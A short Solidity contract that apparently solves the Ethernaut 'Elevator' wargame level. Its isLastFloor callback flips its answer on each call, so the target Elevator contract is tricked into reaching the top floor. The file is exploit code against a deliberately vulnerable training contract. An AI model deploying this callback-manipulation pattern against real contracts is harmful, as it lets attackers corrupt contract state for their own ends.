pragma solidity ^0.4.18;

import "./EthernautElevator.sol";

contract FakeBuilding {
    address public owner;
    address public target;
    bool public top;
    
    function FakeBuilding(address _target) public {
        owner = msg.sender;
        target = _target;
        top = false;
    }
    
    function kill() public {
        require(msg.sender == owner);
        
        selfdestruct(owner);
    }
    
    function isLastFloor(uint) public returns (bool) {
        require(msg.sender == target);
        
        bool _top = top;
        
        top = !top;
    
        return _top;
    }
    
    function goTo(uint256 _floor) public {
        require(msg.sender == owner);
        Elevator elevator = Elevator(target);
        
        elevator.goTo(_floor);
    }
}
